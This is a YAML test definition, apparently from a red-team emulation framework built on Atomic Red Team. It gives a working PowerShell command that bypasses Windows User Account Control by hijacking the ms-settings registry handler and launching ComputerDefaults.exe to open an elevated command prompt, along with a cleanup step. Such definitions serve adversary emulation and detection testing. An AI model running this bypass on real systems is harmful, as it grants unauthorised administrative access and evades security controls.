- id: 3c51abf2-44bf-42d8-9111-dc96ff66750f
  name: Bypass UAC using ComputerDefaults (PowerShell)
  description: 'PowerShell code to bypass User Account Control using ComputerDefaults.exe
    on Windows 10

    Upon execution administrative command prompt should open'
  tactic: defense-evasion
  technique:
    attack_id: T1548.002
    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
  platforms:
    windows:
      psh:
        command: New-Item "HKCU:\software\classes\ms-settings\shell\open\command"
          -Force; New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command"
          -Name "DelegateExecute" -Value "" -Force; Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command"
          -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force; Start-Process
          "C:\Windows\System32\ComputerDefaults.exe"
        cleanup: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse
          -ErrorAction Ignore
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - defense-evasion
  - t1548.002
  author: Atomic Red Team
  additional_info:
    input_arguments:
      executable_binary:
        description: Binary to execute with UAC Bypass
        type: path
        default: C:\Windows\System32\cmd.exe
    technique_created: '2020-01-30T14:24:34.977Z'
    atomic_guid: 3c51abf2-44bf-42d8-9111-dc96ff66750f
    import_timestamp: '2025-09-15T03:08:32.418076Z'
